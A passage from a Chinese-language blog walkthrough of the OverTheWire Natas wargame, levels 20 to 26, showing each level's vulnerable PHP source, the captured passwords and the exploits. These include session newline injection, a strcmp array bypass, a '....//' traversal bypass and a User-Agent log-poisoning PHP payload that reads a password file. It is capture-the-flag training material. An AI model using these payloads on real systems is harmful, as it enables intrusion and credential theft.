class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$data</span>) <span class="keyword">as</span> <span class="variable">$line</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Read [<span class="subst">$line</span>]&quot;</span>);</span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$line</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$parts</span>[<span class="number">0</span>] != <span class="string">&quot;&quot;</span>) <span class="variable">$_SESSION</span>[<span class="variable">$parts</span>[<span class="number">0</span>]] = <span class="variable">$parts</span>[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">session_encode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mywrite</span>(<span class="params"><span class="variable">$sid</span>, <span class="variable">$data</span></span>) </span>&#123; </span><br><span class="line">    <span class="comment">// $data contains the serialized version of $_SESSION</span></span><br><span class="line">    <span class="comment">// but our encoding is better</span></span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;MYWRITE <span class="subst">$sid</span> <span class="subst">$data</span>&quot;</span>); </span><br><span class="line">    <span class="comment">// make sure the sid is alnum only!!</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strspn</span>(<span class="variable">$sid</span>, <span class="string">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;</span>) != <span class="title function_ invoke__">strlen</span>(<span class="variable">$sid</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Invalid SID&quot;</span>); </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">session_save_path</span>() . <span class="string">&quot;/&quot;</span> . <span class="string">&quot;mysess_&quot;</span> . <span class="variable">$sid</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Saving in &quot;</span>. <span class="variable">$filename</span>);</span><br><span class="line">    <span class="title function_ invoke__">ksort</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_SESSION</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;<span class="subst">$key</span> =&gt; <span class="subst">$value</span>&quot;</span>);</span><br><span class="line">        <span class="variable">$data</span> .= <span class="string">&quot;<span class="subst">$key</span> <span class="subst">$value</span>\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">chmod</span>(<span class="variable">$filename</span>, <span class="number">0600</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>查看DEBUG信息：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211114343529.png" alt="image-20200211114343529"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line">   <span class="keyword">foreach</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$data</span>) <span class="keyword">as</span> <span class="variable">$line</span>) &#123;</span><br><span class="line">       <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Read [<span class="subst">$line</span>]&quot;</span>);</span><br><span class="line">   <span class="variable">$parts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$line</span>, <span class="number">2</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$parts</span>[<span class="number">0</span>] != <span class="string">&quot;&quot;</span>) <span class="variable">$_SESSION</span>[<span class="variable">$parts</span>[<span class="number">0</span>]] = <span class="variable">$parts</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure>

<p>这里会将 $data 的值按行处理，比如这里 <code>data</code> 里的内容是 <code>name admin</code> 经过拆分后，设置 <code>$_SESSION[&#39;name&#39;] = admin</code> </p>
<p>那么可以构造 data 数据，令 SESSION 中的 admin &#x3D; 1</p>
<p><code>data = admin \n admin 1\n </code></p>
<p>直接修改请求包：<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211115607201.png" alt="image-20200211115607201"></p>
<p>再次请求即可得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211115830586.png" alt="image-20200211115830586"></p>
<h2 id="Level-21"><a href="#Level-21" class="headerlink" title="Level 21"></a>Level 21</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">IFekPyrQXftziDEsUr3x21sYuahypdgJ</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211120112869.png" alt="image-20200211120112869"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_credentials</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span> <span class="keyword">and</span> <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;admin&quot;</span>, <span class="variable">$_SESSION</span>) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;&lt;pre&gt;Username: natas22\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">print_credentials</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211120153515.png" alt="image-20200211120153515"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// if update was submitted, store it</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;debug&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[DEBUG] Session contents:&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// only allow these keys</span></span><br><span class="line"><span class="variable">$validkeys</span> = <span class="keyword">array</span>(<span class="string">&quot;align&quot;</span> =&gt; <span class="string">&quot;center&quot;</span>, <span class="string">&quot;fontsize&quot;</span> =&gt; <span class="string">&quot;100%&quot;</span>, <span class="string">&quot;bgcolor&quot;</span> =&gt; <span class="string">&quot;yellow&quot;</span>);</span><br><span class="line"><span class="variable">$form</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$form</span> .= <span class="string">&#x27;&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$validkeys</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$defval</span>) &#123;</span><br><span class="line">    <span class="variable">$val</span> = <span class="variable">$defval</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$key</span>, <span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">    <span class="variable">$val</span> = <span class="variable">$_SESSION</span>[<span class="variable">$key</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$form</span> .= <span class="string">&quot;<span class="subst">$key</span>: &lt;input name=&#x27;<span class="subst">$key</span>&#x27; value=&#x27;<span class="subst">$val</span>&#x27; /&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$form</span> .= <span class="string">&#x27;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Update&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$form</span> .= <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$style</span> = <span class="string">&quot;background-color: &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&quot;bgcolor&quot;</span>].<span class="string">&quot;; text-align: &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&quot;align&quot;</span>].<span class="string">&quot;; font-size: &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&quot;fontsize&quot;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="variable">$example</span> = <span class="string">&quot;&lt;div style=&#x27;<span class="subst">$style</span>&#x27;&gt;Hello world!&lt;/div&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>直接在链接的页面POST的数据中添加 <code>admin=1</code> </p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211120733742.png" alt="image-20200211120733742"></p>
<p>然后携带此PHPSESSID去请求原页面，即可得到密码</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211120815810.png" alt="image-20200211120815810"></p>
<h2 id="Level-22"><a href="#Level-22" class="headerlink" title="Level 22"></a>Level 22</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</span><br></pre></td></tr></table></figure>

<p>查看代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;revelio&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">    <span class="comment">// only admins can reveal the password</span></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$_SESSION</span> <span class="keyword">and</span> <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;admin&quot;</span>, <span class="variable">$_SESSION</span>) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] == <span class="number">1</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;revelio&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;&lt;pre&gt;Username: natas23\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>需要GET一个revelio，同时如果存在revelio会重定向回首页，所以要抓包查看返回的密码</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211122500537.png" alt="image-20200211122500537"></p>
<h2 id="Level-23"><a href="#Level-23" class="headerlink" title="Level 23"></a>Level 23</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211122550862.png" alt="image-20200211122550862"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;passwd&quot;</span>,<span class="variable">$_REQUEST</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;passwd&quot;</span>],<span class="string">&quot;iloveyou&quot;</span>) &amp;&amp; (<span class="variable">$_REQUEST</span>[<span class="string">&quot;passwd&quot;</span>] &gt; <span class="number">10</span> ))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Wrong!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// morla / 10111</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<blockquote>
<p> strstr — 查找字符串的首次出现</p>
<p><a href="https://www.php.net/manual/zh/function.strstr.php">https://www.php.net/manual/zh/function.strstr.php</a></p>
</blockquote>
<p>提交的密码既存在 <code>iloveyou</code> ，又要大于10即可得到密码 <code>20iloveyou</code></p>
<ul>
<li>PHP 中字符串和数字的大小比较：<ul>
<li>从字符串起始位置截取数字部分，如果没有则为0 <img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211124502912.png" alt="image-20200211124502912"></li>
</ul>
</li>
</ul>
<h2 id="Level-24"><a href="#Level-24" class="headerlink" title="Level 24"></a>Level 24</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">OsRmXFguozKpTZZ5X14zNO43379LZveg</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;passwd&quot;</span>,<span class="variable">$_REQUEST</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;passwd&quot;</span>],<span class="string">&quot;&lt;censored&gt;&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Wrong!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// morla / 10111</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>利用strcmp报错绕过：（当提交的passwd是一个数组或是一个Object时即可绕过）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://natas24.natas.labs.overthewire.org/?passwd[]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211124912818.png" alt="image-20200211124912818"></p>
<h2 id="Level-25"><a href="#Level-25" class="headerlink" title="Level 25"></a>Level 25</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GHF6X7YwACaYYssHVY05cFq83hRktl4c</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// cheers and &lt;3 to malvina</span></span><br><span class="line">    <span class="comment">// - morla</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setLanguage</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">/* language setup */</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;lang&quot;</span>,<span class="variable">$_REQUEST</span>))</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">safeinclude</span>(<span class="string">&quot;language/&quot;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&quot;lang&quot;</span>] ))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="title function_ invoke__">safeinclude</span>(<span class="string">&quot;language/en&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">safeinclude</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// check for directory traversal</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$filename</span>,<span class="string">&quot;../&quot;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">logRequest</span>(<span class="string">&quot;Directory traversal attempt! fixing request.&quot;</span>);</span><br><span class="line">            <span class="variable">$filename</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;../&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// dont let ppl steal our passwords</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$filename</span>,<span class="string">&quot;natas_webpass&quot;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">logRequest</span>(<span class="string">&quot;Illegal file access detected! Aborting!&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// add more checks...</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123; </span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">listFiles</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$listoffiles</span>=<span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$handle</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$path</span>))</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">false</span> !== (<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$handle</span>)))</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>)</span><br><span class="line">                    <span class="variable">$listoffiles</span>[]=<span class="variable">$file</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">closedir</span>(<span class="variable">$handle</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$listoffiles</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logRequest</span>(<span class="params"><span class="variable">$message</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$log</span>=<span class="string">&quot;[&quot;</span>. <span class="title function_ invoke__">date</span>(<span class="string">&quot;d.m.Y H::i:s&quot;</span>,<span class="title function_ invoke__">time</span>()) .<span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="variable">$log</span>=<span class="variable">$log</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">        <span class="variable">$log</span>=<span class="variable">$log</span> . <span class="string">&quot; \&quot;&quot;</span> . <span class="variable">$message</span> .<span class="string">&quot;\&quot;\n&quot;</span>; </span><br><span class="line">        <span class="variable">$fd</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;/var/www/natas/natas25/logs/natas25_&quot;</span> . <span class="title function_ invoke__">session_id</span>() .<span class="string">&quot;.log&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fd</span>,<span class="variable">$log</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fd</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>目录遍历，这里只是将 <code>../</code> 替换为空，可以通过双写绕过 <code>....//</code> </p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211150859737.png" alt="可以看到当前路径"></p>
<p>因为后续将  <code>natas_webpass </code> 置于黑名单了，所以不能直接读取，那么就要利用后面的写日志操间接读取，根据函数中的命名，查看当前SID的日志</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211151156489.png" alt="image-20200211151156489"></p>
<p>在 User-Agent 处进行构造：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">User-Agent: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/etc/natas_webpass/natas26&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> 再次请求即可得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211151934402.png" alt="image-20200211151934402"></p>
<h2 id="Level-26"><a href="#Level-26" class="headerlink" title="Level 26"></a>Level 26</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T</span><br></pre></td></tr></table></figure>

<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// sry, this is ugly as hell.</span></span><br><span class="line">    <span class="comment">// cheers kaliman ;)</span></span><br><span class="line">    <span class="comment">// - morla</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$logFile</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$initMsg</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exitMsg</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// initialise variables</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;initMsg=<span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exitMsg=<span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logFile = <span class="string">&quot;/tmp/natas26_&quot;</span> . <span class="variable">$file</span> . <span class="string">&quot;.log&quot;</span>;</span><br><span class="line">      </span><br><span class="line">            <span class="comment">// write initial message</span></span><br><span class="line">            <span class="variable">$fd</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$this</span>-&gt;logFile,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fd</span>,<span class="variable">$initMsg</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fd</span>);</span><br><span class="line">        &#125;                       </span><br><span class="line">      </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$fd</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$this</span>-&gt;logFile,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fd</span>,<span class="variable">$msg</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fd</span>);</span><br><span class="line">        &#125;                       </span><br><span class="line">      </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// write exit message</span></span><br><span class="line">            <span class="variable">$fd</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$this</span>-&gt;logFile,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fd</span>,<span class="variable">$this</span>-&gt;exitMsg);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fd</span>);</span><br><span class="line">        &#125;                       </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">$filename</span>\&quot;&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">drawImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$img</span>=<span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">400</span>,<span class="number">300</span>);</span><br><span class="line">        <span class="title function_ invoke__">drawFromUserdata</span>(<span class="variable">$img</span>);</span><br><span class="line">        <span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="variable">$filename</span>);     </span><br><span class="line">        <span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$img</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">drawFromUserdata</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;x1&quot;</span>, <span class="variable">$_GET</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;y1&quot;</span>, <span class="variable">$_GET</span>) &amp;&amp;</span><br><span class="line">            <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;x2&quot;</span>, <span class="variable">$_GET</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;y2&quot;</span>, <span class="variable">$_GET</span>))&#123;</span><br><span class="line">        </span><br><span class="line">            <span class="variable">$color</span>=<span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>,<span class="number">0xff</span>,<span class="number">0x12</span>,<span class="number">0x1c</span>);</span><br><span class="line">            <span class="title function_ invoke__">imageline</span>(<span class="variable">$img</span>,<span class="variable">$_GET</span>[<span class="string">&quot;x1&quot;</span>], <span 